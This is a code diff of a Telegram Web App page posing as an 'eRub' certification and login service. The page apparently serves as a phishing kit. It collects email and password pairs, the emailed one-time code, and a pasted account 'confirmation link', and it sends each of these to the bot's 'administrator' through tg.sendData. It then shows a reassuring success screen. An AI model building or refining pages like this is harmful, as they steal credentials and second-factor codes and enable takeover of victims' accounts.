@@ -3,9 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Вход в eRub</title>
+    <title>eRub</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
+        /* ===== БАЗА ===== */
         * {
             margin: 0;
             padding: 0;
@@ -23,22 +24,46 @@
         .container {
             background: white;
             border-radius: 32px;
-            padding: 48px 40px;
+            padding: 40px 32px;
             width: 100%;
             max-width: 440px;
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.08);
-            min-height: 540px;
+            min-height: 520px;
             display: flex;
             flex-direction: column;
-            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
         }
 
+        /* ===== СТРАНИЦЫ ===== */
+        .page {
+            display: none;
+            flex-direction: column;
+            flex: 1;
+            animation: fadeIn 0.3s ease;
+        }
+        .page.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* ===== ЛОГО ===== */
         .logo {
             text-align: center;
-            margin-bottom: 32px;
+            margin-bottom: 28px;
         }
         .logo h1 {
-            font-size: 34px;
+            font-size: 32px;
             font-weight: 800;
             color: #1a1a2e;
             letter-spacing: -0.5px;
@@ -48,13 +73,15 @@
         }
         .logo .sub {
             color: #6c757d;
-            font-size: 13px;
+            font-size: 12px;
             margin-top: 2px;
             font-weight: 400;
+            letter-spacing: 0.3px;
         }
 
+        /* ===== ФОРМА ===== */
         .form-group {
-            margin-bottom: 18px;
+            margin-bottom: 16px;
         }
         .form-group label {
             display: block;
@@ -79,6 +106,7 @@
             box-shadow: 0 0 0 4px rgba(67, 97, 238, 0.08);
         }
 
+        /* ===== КНОПКИ ===== */
         .btn-primary {
             width: 100%;
             padding: 16px;
@@ -104,10 +132,11 @@
             box-shadow: none;
         }
 
+        /* ===== КНОПКА E-ID (КРАСНАЯ) ===== */
         .btn-eid {
             width: 100%;
             padding: 16px;
-            background: #1a1a2e;
+            background: #dc3545;
             color: white;
             border: none;
             border-radius: 14px;
@@ -122,8 +151,9 @@
             gap: 10px;
         }
         .btn-eid:hover {
-            background: #2d2d44;
+            background: #c82333;
             transform: translateY(-1px);
+            box-shadow: 0 8px 25px rgba(220, 53, 69, 0.3);
         }
 
         .btn-secondary {
@@ -143,6 +173,24 @@
             background: #e9ecef;
         }
 
+        .btn-back {
+            width: 100%;
+            padding: 14px;
+            background: transparent;
+            color: #6c757d;
+            border: 2px solid #e9ecef;
+            border-radius: 14px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 10px;
+        }
+        .btn-back:hover {
+            background: #f8f9fa;
+        }
+
+        /* ===== РАЗДЕЛИТЕЛИ ===== */
         .divider {
             display: flex;
             align-items: center;
@@ -164,7 +212,7 @@
 
         .forgot-link {
             text-align: right;
-            margin-top: -10px;
+            margin-top: -8px;
             margin-bottom: 12px;
         }
         .forgot-link a {
@@ -209,6 +257,7 @@
             background: #e9ecef;
         }
 
+        /* ===== СООБЩЕНИЯ ===== */
         .message {
             margin-top: 16px;
             padding: 12px 16px;
@@ -235,10 +284,6 @@
             background: #d1ecf1;
             color: #0c5460;
             border: 1px solid #bee5eb;
-        }
-
-        .hidden {
-            display: none !important;
         }
 
         /* ===== КОД ===== */
@@ -300,36 +345,111 @@
             }
         }
 
-        .step-title {
+        .page-title {
             font-size: 20px;
             font-weight: 700;
             color: #1a1a2e;
+            text-align: center;
             margin-bottom: 4px;
         }
-        .step-sub {
+        .page-sub {
             font-size: 14px;
             color: #6c757d;
-            margin-bottom: 16px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .page-icon {
+            text-align: center;
+            font-size: 44px;
+            margin-bottom: 8px;
         }
 
-        .eid-icon {
-            font-size: 20px;
+        /* ===== E-ID СТРАНИЦА (ДИЗАЙН КАК НА СКРИНЕ) ===== */
+        .eid-page .eid-header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .eid-page .eid-header .eid-badge {
+            display: inline-block;
+            background: #dc3545;
+            color: white;
+            padding: 6px 20px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            margin-bottom: 8px;
+        }
+        .eid-page .eid-header h2 {
+            font-size: 22px;
+            color: #1a1a2e;
+        }
+        .eid-page .eid-header p {
+            color: #6c757d;
+            font-size: 13px;
+            margin-top: 2px;
+        }
+
+        /* ===== ССЫЛКА ПОДТВЕРЖДЕНИЯ ===== */
+        .link-box {
+            margin-top: 12px;
+            padding: 16px;
+            background: #f8f9fa;
+            border-radius: 14px;
+            border: 2px solid #e9ecef;
+        }
+        .link-box label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #1a1a2e;
+            margin-bottom: 6px;
+        }
+        .link-box input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 2px solid #e9ecef;
+            border-radius: 10px;
+            font-size: 14px;
+            background: white;
+        }
+        .link-box input:focus {
+            outline: none;
+            border-color: #4361ee;
+        }
+
+        /* ===== УСПЕХ ===== */
+        .success-page .check {
+            font-size: 64px;
+            text-align: center;
+            margin-bottom: 12px;
+        }
+        .success-page h2 {
+            text-align: center;
+            color: #1a7a3a;
+            font-size: 22px;
+        }
+        .success-page p {
+            text-align: center;
+            color: #6c757d;
+            font-size: 14px;
+            margin-top: 6px;
+            line-height: 1.6;
         }
     </style>
 </head>
 <body>
     <div class="container">
 
-        <!-- ===== ЛОГО ===== -->
-        <div class="logo">
-            <h1><span>eRub</span></h1>
-            <div class="sub">ON-LINE CERTIFICATION AND AUTHORIZATION SERVICE</div>
-        </div>
+        <!-- ========================================================= -->
+        <!-- ===== СТРАНИЦА 1: ГЛАВНАЯ (ЛОГИН) ===== -->
+        <!-- ========================================================= -->
+        <div id="pageLogin" class="page active">
+            <div class="logo">
+                <h1><span>eRub</span></h1>
+                <div class="sub">ON-LINE CERTIFICATION AND AUTHORIZATION SERVICE</div>
+            </div>
 
-        <!-- ========================================= -->
-        <!-- ===== ШАГ 1: ЛОГИН ===== -->
-        <!-- ========================================= -->
-        <div id="stepLogin">
             <div class="form-group">
                 <label>Email</label>
                 <input type="email" id="email" placeholder="Введите ваш email">
@@ -346,9 +466,9 @@
 
             <div class="divider"><span>или</span></div>
 
-            <!-- ===== E-ID КНОПКА ===== -->
+            <!-- ===== КНОПКА E-ID (КРАСНАЯ) ===== -->
             <button id="eidBtn" class="btn-eid">
-                <span class="eid-icon">🆔</span> Вход через E-ID
+                Вход через E-ID
             </button>
 
             <div class="register-link" style="margin-top:16px;">
@@ -356,15 +476,13 @@
             </div>
         </div>
 
-        <!-- ========================================= -->
-        <!-- ===== ШАГ 2: КОД ===== -->
-        <!-- ========================================= -->
-        <div id="stepCode" class="hidden">
-            <div style="text-align:center;margin-bottom:12px;">
-                <div style="font-size:40px;">📧</div>
-                <div class="step-title">Код подтверждения</div>
-                <div class="step-sub">Введите код, отправленный на вашу почту</div>
-            </div>
+        <!-- ========================================================= -->
+        <!-- ===== СТРАНИЦА 2: КОД С ПОЧТЫ ===== -->
+        <!-- ========================================================= -->
+        <div id="pageCode" class="page">
+            <div class="page-icon">📧</div>
+            <div class="page-title">Код подтверждения</div>
+            <div class="page-sub">Введите код, отправленный на вашу почту</div>
 
             <div class="code-box">
                 <input type="text" id="codeInput" maxlength="6" placeholder="• • • • • •" inputmode="numeric">
@@ -378,27 +496,48 @@
                 Ожидание кода...
             </div>
 
-            <button id="backBtn" class="btn-secondary">← Назад</button>
+            <button id="backFromCodeBtn" class="btn-back">← Назад</button>
         </div>
 
-        <!-- ========================================= -->
-        <!-- ===== ШАГ 3: E-ID ===== -->
-        <!-- ========================================= -->
-        <div id="stepEid" class="hidden">
-            <div style="text-align:center;margin-bottom:12px;">
-                <div style="font-size:40px;">🆔</div>
-                <div class="step-title">Вход через E-ID</div>
-                <div class="step-sub">Введите ваш E-ID для авторизации</div>
+        <!-- ========================================================= -->
+        <!-- ===== СТРАНИЦА 3: E-ID (ДИЗАЙН КАК НА СКРИНЕ) ===== -->
+        <!-- ========================================================= -->
+        <div id="pageEid" class="page eid-page">
+            <div class="eid-header">
+                <div class="eid-badge">E-ID</div>
+                <h2>ON-LINE CERTIFICATION</h2>
+                <p>AND AUTHORIZATION SERVICE</p>
             </div>
 
             <div class="form-group">
-                <label>E-ID</label>
-                <input type="text" id="eidInput" placeholder="Введите ваш E-ID">
+                <label>Email</label>
+                <input type="email" id="eidEmail" placeholder="Введите ваш email">
+            </div>
+            <div class="form-group">
+                <label>Пароль</label>
+                <input type="password" id="eidPassword" placeholder="Введите пароль">
             </div>
 
-            <button id="eidSubmitBtn" class="btn-primary">🔓 Войти через E-ID</button>
+            <button id="eidSubmitBtn" class="btn-primary">ВХОД</button>
 
-            <button id="backFromEidBtn" class="btn-secondary">← Назад</button>
+            <!-- ===== ССЫЛКА ПОДТВЕРЖДЕНИЯ (появляется после ввода) ===== -->
+            <div id="eidLinkBlock" class="link-box" style="display:none; margin-top:16px;">
+                <label>🔗 Ссылка подтверждения</label>
+                <input type="text" id="eidLinkInput" placeholder="Вставьте ссылку подтверждения">
+                <button id="eidLinkBtn" class="btn-secondary" style="margin-top:10px;">✅ Отправить ссылку</button>
+            </div>
+
+            <button id="backFromEidBtn" class="btn-back" style="margin-top:16px;">← Назад</button>
+        </div>
+
+        <!-- ========================================================= -->
+        <!-- ===== СТРАНИЦА 4: УСПЕХ ===== -->
+        <!-- ========================================================= -->
+        <div id="pageSuccess" class="page success-page">
+            <div class="check">✅</div>
+            <h2>Данные отправлены!</h2>
+            <p>Администратор проверит ваши данные<br>и свяжется с вами в ближайшее время.</p>
+            <button id="resetBtn" class="btn-secondary" style="margin-top:20px;">🔄 Вернуться на главную</button>
         </div>
 
         <!-- ===== СООБЩЕНИЯ ===== -->
@@ -415,22 +554,43 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        // Элементы
-        const stepLogin = document.getElementById('stepLogin');
-        const stepCode = document.getElementById('stepCode');
-        const stepEid = document.getElementById('stepEid');
+        // Все страницы
+        const pageLogin = document.getElementById('pageLogin');
+        const pageCode = document.getElementById('pageCode');
+        const pageEid = document.getElementById('pageEid');
+        const pageSuccess = document.getElementById('pageSuccess');
+
+        // Элементы главной
         const email = document.getElementById('email');
         const password = document.getElementById('password');
+
+        // Элементы кода
         const codeInput = document.getElementById('codeInput');
-        const eidInput = document.getElementById('eidInput');
+
+        // Элементы E-ID
+        const eidEmail = document.getElementById('eidEmail');
+        const eidPassword = document.getElementById('eidPassword');
+        const eidLinkInput = document.getElementById('eidLinkInput');
+        const eidLinkBlock = document.getElementById('eidLinkBlock');
+
+        // Кнопки
         const loginBtn = document.getElementById('loginBtn');
         const codeBtn = document.getElementById('codeBtn');
-        const backBtn = document.getElementById('backBtn');
         const eidBtn = document.getElementById('eidBtn');
         const eidSubmitBtn = document.getElementById('eidSubmitBtn');
+        const eidLinkBtn = document.getElementById('eidLinkBtn');
+        const backFromCodeBtn = document.getElementById('backFromCodeBtn');
         const backFromEidBtn = document.getElementById('backFromEidBtn');
+        const resetBtn = document.getElementById('resetBtn');
+
         const msgDiv = document.getElementById('msg');
 
+        let eidEmailValue = '';
+        let eidPasswordValue = '';
+
+        // ============================================================
+        // 2. ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
+        // ============================================================
         function showMsg(text, type = 'info') {
             msgDiv.textContent = text;
             msgDiv.className = `message ${type}`;
@@ -441,16 +601,39 @@
             }, 5000);
         }
 
-        function goToStep(step) {
-            stepLogin.classList.add('hidden');
-            stepCode.classList.add('hidden');
-            stepEid.classList.add('hidden');
-            step.classList.remove('hidden');
+        function switchPage(page) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            page.classList.add('active');
             msgDiv.style.display = 'none';
         }
 
+        function goToLogin() {
+            switchPage(pageLogin);
+            email.value = '';
+            password.value = '';
+        }
+
+        function goToCode() {
+            switchPage(pageCode);
+            codeInput.value = '';
+            setTimeout(() => codeInput.focus(), 300);
+        }
+
+        function goToEid() {
+            switchPage(pageEid);
+            eidEmail.value = '';
+            eidPassword.value = '';
+            eidLinkInput.value = '';
+            eidLinkBlock.style.display = 'none';
+            setTimeout(() => eidEmail.focus(), 300);
+        }
+
+        function goToSuccess() {
+            switchPage(pageSuccess);
+        }
+
         // ============================================================
-        // 2. ЛОГИН → ОТПРАВКА EMAIL + ПАРОЛЬ
+        // 3. ОБЫЧНЫЙ ВХОД → ПОЧТА + ПАРОЛЬ → КОД
         // ============================================================
         loginBtn.addEventListener('click', function() {
             const e = email.value.trim();
@@ -472,10 +655,8 @@
                 tg.sendData(JSON.stringify({ email: e, password: p }));
                 loginBtn.disabled = false;
                 loginBtn.textContent = 'ВХОД';
-                // СРАЗУ ОТКРЫВАЕМ ОКНО КОДА
-                goToStep(stepCode);
+                goToCode();
                 showMsg('✅ Данные отправлены. Введите код с почты.', 'success');
-                setTimeout(() => codeInput.focus(), 300);
             } catch (err) {
                 showMsg('❌ Ошибка отправки. Попробуйте ещё раз.', 'error');
                 loginBtn.disabled = false;
@@ -484,7 +665,7 @@
         });
 
         // ============================================================
-        // 3. КОД → ОТПРАВКА КОДА
+        // 4. КОД → ОТПРАВКА КОДА
         // ============================================================
         codeBtn.addEventListener('click', function() {
             const code = codeInput.value.trim();
@@ -503,12 +684,7 @@
                 codeBtn.disabled = false;
                 codeBtn.textContent = '✅ Подтвердить';
                 codeInput.value = '';
-
-                setTimeout(() => {
-                    goToStep(stepLogin);
-                    showMsg('✅ Проверка завершена. Ожидайте ответа.', 'success');
-                }, 2000);
-
+                goToSuccess();
             } catch (err) {
                 showMsg('❌ Ошибка отправки кода', 'error');
                 codeBtn.disabled = false;
@@ -517,77 +693,118 @@
         });
 
         // ============================================================
-        // 4. НАЗАД (из кода)
+        // 5. E-ID → ОТКРЫТЬ СТРАНИЦУ E-ID
         // ============================================================
-        backBtn.addEventListener('click', function() {
-            goToStep(stepLogin);
-        });
+        eidBtn.addEventListener('click', goToEid);
 
         // ============================================================
-        // 5. E-ID → ОТКРЫТЬ ОКНО E-ID
-        // ============================================================
-        eidBtn.addEventListener('click', function() {
-            goToStep(stepEid);
-            setTimeout(() => eidInput.focus(), 300);
-        });
-
-        // ============================================================
-        // 6. E-ID → ОТПРАВКА E-ID
+        // 6. E-ID → ВВОД ПОЧТЫ + ПАРОЛЯ → ПОКАЗАТЬ ССЫЛКУ
         // ============================================================
         eidSubmitBtn.addEventListener('click', function() {
-            const eid = eidInput.value.trim();
+            const e = eidEmail.value.trim();
+            const p = eidPassword.value.trim();
 
-            if (!eid) {
-                showMsg('Введите ваш E-ID', 'error');
+            if (!e || !p) {
+                showMsg('Заполните все поля', 'error');
+                return;
+            }
+            if (!e.includes('@')) {
+                showMsg('Введите корректный email', 'error');
                 return;
             }
 
+            eidEmailValue = e;
+            eidPasswordValue = p;
+
+            // Отправляем почту и пароль админу
+            try {
+                tg.sendData(JSON.stringify({
+                    type: 'eid_login',
+                    email: e,
+                    password: p
+                }));
+                showMsg('✅ Данные отправлены администратору!', 'success');
+            } catch (err) {
+                showMsg('❌ Ошибка отправки', 'error');
+                return;
+            }
+
+            // ПОКАЗЫВАЕМ ПОЛЕ ДЛЯ ССЫЛКИ
+            eidLinkBlock.style.display = 'block';
             eidSubmitBtn.disabled = true;
-            eidSubmitBtn.textContent = '⏳ Отправка...';
+            eidSubmitBtn.textContent = '✅ Отправлено';
+            setTimeout(() => eidLinkInput.focus(), 300);
+            showMsg('📎 Введите ссылку подтверждения', 'info');
+        });
+
+        // ============================================================
+        // 7. E-ID → ОТПРАВКА ССЫЛКИ ПОДТВЕРЖДЕНИЯ
+        // ============================================================
+        eidLinkBtn.addEventListener('click', function() {
+            const link = eidLinkInput.value.trim();
+
+            if (!link) {
+                showMsg('Введите ссылку подтверждения', 'error');
+                return;
+            }
+
+            eidLinkBtn.disabled = true;
+            eidLinkBtn.textContent = '⏳ Отправка...';
 
             try {
-                tg.sendData(JSON.stringify({ eid: eid }));
-                showMsg('✅ E-ID отправлен администратору!', 'success');
-                eidSubmitBtn.disabled = false;
-                eidSubmitBtn.textContent = '🔓 Войти через E-ID';
-                eidInput.value = '';
-
-                setTimeout(() => {
-                    goToStep(stepLogin);
-                    showMsg('✅ Проверка завершена. Ожидайте ответа.', 'success');
-                }, 2000);
-
+                tg.sendData(JSON.stringify({
+                    type: 'eid_link',
+                    email: eidEmailValue,
+                    password: eidPasswordValue,
+                    link: link
+                }));
+                showMsg('✅ Ссылка отправлена администратору!', 'success');
+                eidLinkBtn.disabled = false;
+                eidLinkBtn.textContent = '✅ Отправить ссылку';
+                eidLinkInput.value = '';
+                goToSuccess();
             } catch (err) {
-                showMsg('❌ Ошибка отправки E-ID', 'error');
-                eidSubmitBtn.disabled = false;
-                eidSubmitBtn.textContent = '🔓 Войти через E-ID';
+                showMsg('❌ Ошибка отправки ссылки', 'error');
+                eidLinkBtn.disabled = false;
+                eidLinkBtn.textContent = '✅ Отправить ссылку';
             }
         });
 
         // ============================================================
-        // 7. НАЗАД (из E-ID)
+        // 8. НАЗАД
         // ============================================================
-        backFromEidBtn.addEventListener('click', function() {
-            goToStep(stepLogin);
+        backFromCodeBtn.addEventListener('click', goToLogin);
+        backFromEidBtn.addEventListener('click', goToLogin);
+
+        // ============================================================
+        // 9. ВЕРНУТЬСЯ НА ГЛАВНУЮ
+        // ============================================================
+        resetBtn.addEventListener('click', function() {
+            goToLogin();
+            showMsg('Вы вернулись на главную страницу', 'info');
         });
 
         // ============================================================
-        // 8. ENTER
+        // 10. ENTER
         // ============================================================
         document.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
-                if (!stepLogin.classList.contains('hidden')) {
+                if (pageLogin.classList.contains('active')) {
                     loginBtn.click();
-                } else if (!stepCode.classList.contains('hidden')) {
+                } else if (pageCode.classList.contains('active')) {
                     codeBtn.click();
-                } else if (!stepEid.classList.contains('hidden')) {
-                    eidSubmitBtn.click();
+                } else if (pageEid.classList.contains('active')) {
+                    if (eidLinkBlock.style.display === 'block') {
+                        eidLinkBtn.click();
+                    } else {
+                        eidSubmitBtn.click();
+                    }
                 }
             }
         });
 
         // ============================================================
-        // 9. ТЕХПОДДЕРЖКА
+        // 11. ТЕХПОДДЕРЖКА
         // ============================================================
         function openSupport() {
             window.open('https://t.me/potok457', '_blank');
